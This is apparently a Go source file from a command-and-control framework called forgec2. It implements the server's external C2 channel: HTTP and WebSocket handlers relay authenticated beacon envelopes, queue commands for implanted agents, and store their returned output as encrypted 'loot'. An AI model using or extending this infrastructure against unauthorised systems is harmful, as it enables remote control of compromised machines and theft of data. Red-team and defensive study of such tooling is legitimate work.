package server

import (
	"crypto/subtle"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

type extC2ReceiveRequest struct {
	BeaconID string `json:"beacon_id"`
	Raw      string `json:"raw"` // base64-encoded raw beacon data
}

type extC2ReceiveResponse struct {
	Success bool   `json:"success"`
	Data    string `json:"data,omitempty"` // base64-encoded response
	Error   string `json:"error,omitempty"`
}

type extC2SendRequest struct {
	BeaconID string `json:"beacon_id"`
	Data     string `json:"data"` // base64-encoded response data
}

type extC2SendResponse struct {
	Success bool   `json:"success"`
	Error   string `json:"error,omitempty"`
}

func (s *Server) checkExtC2Token(c *gin.Context) bool {
	s.configMu.RLock()
	token := s.cfg.RateLimit.ExtC2.APIToken
	s.configMu.RUnlock()
	if token == "" {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"success": false, "error": "extc2 token not configured"})
		return false
	}
	headerToken := c.GetHeader("X-ExtC2-Token")
	if headerToken == "" {
		headerToken = c.GetHeader("Authorization")
	}
	if subtle.ConstantTimeCompare([]byte(headerToken), []byte(token)) != 1 {
		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"success": false, "error": "unauthorized"})
		return false
	}
	return true
}

func (s *Server) handleExtC2Receive(c *gin.Context) {
	if !s.checkExtC2Token(c) {
		return
	}
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, MaxJSONBodySize)
	var req extC2ReceiveRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: "Invalid request"})
		return
	}

	slog.Info("External C2 receive", "beacon_id", req.BeaconID, "raw_len", len(req.Raw))

	raw, err := base64.StdEncoding.DecodeString(req.Raw)
	if err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: sanitizeError(err, "Base64 decode")})
		return
	}

	// The raw payload is a full v2 beacon envelope, exactly like the HTTP
	// beacon body. Run it through the complete envelope gate (ECDH AEAD with
	// AAD-bound UUID+seq, replay window, timestamp tolerance) instead of
	// trusting an opaque JSON blob — otherwise a holder of the shared
	// X-ExtC2-Token could impersonate arbitrary agents and inject results or
	// drain queued tasks. BeaconID is intentionally NOT applied: the agent
	// identity comes from the authenticated envelope and cannot be spoofed.
	env, br, kind := s.decodeBeaconEnvelope(raw)
	if kind == frameRejected {
		c.JSON(http.StatusUnauthorized, extC2ReceiveResponse{Error: "invalid beacon envelope"})
		return
	}

	var respBytes []byte
	if kind == frameEncrypted {
		resp := s.processBeacon(br, "")
		if s.sessionManager != nil && s.sessionManager.NeedsRekey(br.UUID, BeaconSessionRekeyMessages) {
			resp.Rekey = true
		}
		var ok bool
		respBytes, ok = s.buildBeaconResponse(br.UUID, env.Seq, resp)
		if !ok {
			c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: "response build failed"})
			return
		}
	} else {
		var ok bool
		respBytes, ok = s.processAuthFrame(env, kind)
		if !ok {
			c.JSON(http.StatusUnauthorized, extC2ReceiveResponse{Error: "authentication failed"})
			return
		}
	}

	respJSON, err := json.Marshal(struct {
		Success bool   `json:"success"`
		Data    string `json:"data"`
	}{Success: true, Data: base64.StdEncoding.EncodeToString(respBytes)})
	if err != nil {
		c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: sanitizeError(err, "Response encoding")})
		return
	}

	c.Data(http.StatusOK, "application/json", respJSON)
}

func (s *Server) handleExtC2Send(c *gin.Context) {
	if !s.checkExtC2Token(c) {
		return
	}
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, MaxJSONBodySize)
	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: sanitizeError(err, "Read request")})
		return
	}

	var req extC2SendRequest
	if err := json.Unmarshal(body, &req); err != nil {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: sanitizeError(err, "Parse request")})
		return
	}

	if req.BeaconID == "" {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: "beacon_id is required"})
		return
	}

	slog.Info("External C2 send", "beacon_id", req.BeaconID, "data_len", len(req.Data))

	s.extC2ChannelsMu.Lock()
	channelIDs := make([]string, 0, len(s.extC2Channels))
	for id := range s.extC2Channels {
		channelIDs = append(channelIDs, id)
	}
	s.extC2ChannelsMu.Unlock()

	if len(channelIDs) == 0 {
		c.JSON(http.StatusServiceUnavailable, extC2SendResponse{Error: "no active extc2 channels"})
		return
	}

	for _, channelID := range channelIDs {
		s.QueueExtC2Task(channelID, extC2Task{
			AgentID: req.BeaconID,
			Type:    "send",
			Command: req.Data,
		})
	}

	c.JSON(http.StatusOK, extC2SendResponse{Success: true})
}

// --- WebSocket External C2 ---

type extC2WSChannel struct {
	ID        string
	Type      string // "websocket", "discord", "slack"
	Conn      *websocket.Conn
	CreatedAt time.Time
	mu        sync.Mutex
}

func (ch *extC2WSChannel) SendJSON(v interface{}) error {
	ch.mu.Lock()
	defer ch.mu.Unlock()
	if ch.Conn == nil {
		return fmt.Errorf("connection closed")
	}
	ch.Conn.SetWriteDeadline(time.Now().Add(ExtC2WriteTimeout))
	return ch.Conn.WriteJSON(v)
}

type extC2ChannelInfo struct {
	ID        string `json:"id"`
	Type      string `json:"type"`
	CreatedAt string `json:"created_at"`
}

type extC2WSMessage struct {
	AgentID string `json:"agent_id"`
	Type    string `json:"type"` // "task" or "result"
	TaskID  uint   `json:"task_id,omitempty"`
	Result  string `json:"result,omitempty"`
}

type extC2Task struct {
	AgentID string `json:"agent_id"`
	Type    string `json:"type"`
	Command string `json:"command"`
}

func (s *Server) handleExternalC2WebSocket(c *gin.Context) {
	if !s.checkExtC2Token(c) {
		return
	}
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("External C2 WebSocket upgrade failed", "error", err)
		return
	}
	defer conn.Close()

	channelID := fmt.Sprintf("extc2-ws-%d", time.Now().UnixNano())
	ch := &extC2WSChannel{
		ID:        channelID,
		Type:      "websocket",
		Conn:      conn,
		CreatedAt: time.Now(),
	}
	s.extC2ChannelsMu.Lock()
	s.extC2Channels[channelID] = ch
	s.extC2ChannelsMu.Unlock()

	s.extC2TaskMu.Lock()
	s.extC2Notify[channelID] = make(chan struct{}, 1)
	s.extC2TaskMu.Unlock()

	defer func() {
		s.extC2ChannelsMu.Lock()
		delete(s.extC2Channels, channelID)
		s.extC2ChannelsMu.Unlock()
		s.extC2TaskMu.Lock()
		delete(s.extC2Notify, channelID)
		s.extC2TaskMu.Unlock()
	}()

	slog.Info("External C2 WebSocket connected", "channel_id", channelID)

	// Send task queue reader in a goroutine (push-based via notify channel)
	done := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			// Snapshot the notify channel under the lock: the map is written
			// by other goroutines (QueueExtC2Task, channel cleanup), so reading
			// it here without the lock races a concurrent map read/write.
			s.extC2TaskMu.Lock()
			notifyCh := s.extC2Notify[channelID]
			s.extC2TaskMu.Unlock()
			select {
			case <-done:
				return
			case <-notifyCh:
			case <-ticker.C:
			}
			s.extC2TaskMu.Lock()
			tasks := s.extC2TaskQueue[channelID]
			s.extC2TaskQueue[channelID] = nil
			s.extC2TaskMu.Unlock()
			for _, task := range tasks {
				msg, ok := marshalJSONSafe(task)
				if !ok {
					continue
				}
				ch.SendJSON(json.RawMessage(msg))
			}
		}
	}()

	// Read loop: receive results from external agent
	conn.SetReadLimit(WSMaxMessageSize)
	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		_, msg, err := conn.ReadMessage()
		if err != nil {
			slog.Info("External C2 WebSocket disconnected", "channel_id", channelID, "error", err)
			break
		}

		var extMsg extC2WSMessage
		if json.Unmarshal(msg, &extMsg) != nil {
			continue
		}

		if extMsg.Type == "result" {
			s.processExternalC2Result(extMsg.AgentID, extMsg.TaskID, extMsg.Result)
		} else if extMsg.Type == "task_request" {
			// Agent is requesting its next task — respond immediately
			s.extC2TaskMu.Lock()
			if len(s.extC2TaskQueue[channelID]) > 0 {
				task := s.extC2TaskQueue[channelID][0]
				s.extC2TaskQueue[channelID] = s.extC2TaskQueue[channelID][1:]
				s.extC2TaskMu.Unlock()
				ch.SendJSON(task)
			} else {
				s.extC2TaskMu.Unlock()
				ch.SendJSON(map[string]string{"type": "noop"})
			}
		}
	}
	close(done)
}

func (s *Server) processExternalC2Result(agentID string, taskID uint, result string) {
	if taskID == 0 {
		return
	}
	// Encrypt result at rest (H3) so command output is not stored as plaintext.
	if enc, err := crypto.EncryptLoot(result); err == nil {
		result = enc
	}
	if err := s.db.Model(&db.Task{}).Where("id = ? AND agent_id = ?", taskID, agentID).Updates(map[string]interface{}{
		"status":     "completed",
		"result":     result,
		"updated_at": time.Now(),
	}).Error; err != nil {
		slog.Error("Failed to update task result from extc2", "task_id", taskID, "agent_id", agentID, "err", err)
		return
	}
	slog.Info("External C2 result processed", "agent_id", agentID, "task_id", taskID)
}

func (s *Server) handleListExtC2Channels(c *gin.Context) {
	s.extC2ChannelsMu.Lock()
	defer s.extC2ChannelsMu.Unlock()

	channels := make([]extC2ChannelInfo, 0, len(s.extC2Channels))
	for _, ch := range s.extC2Channels {
		channels = append(channels, extC2ChannelInfo{
			ID:        ch.ID,
			Type:      ch.Type,
			CreatedAt: ch.CreatedAt.Format(time.RFC3339),
		})
	}
	c.JSON(http.StatusOK, gin.H{"channels": channels})
}

func (s *Server) QueueExtC2Task(channelID string, task extC2Task) {
	s.extC2TaskMu.Lock()
	defer s.extC2TaskMu.Unlock()
	queue := s.extC2TaskQueue[channelID]
	if len(queue) >= MaxExtC2QueuePerChan {
		slog.Warn("ExtC2 task queue full, dropping oldest task", "channel", channelID, "limit", MaxExtC2QueuePerChan)
		queue = queue[1:]
	}
	s.extC2TaskQueue[channelID] = append(queue, task)
	if ch, ok := s.extC2Notify[channelID]; ok {
		select {
		case ch <- struct{}{}:
		default:
		}
	}
}
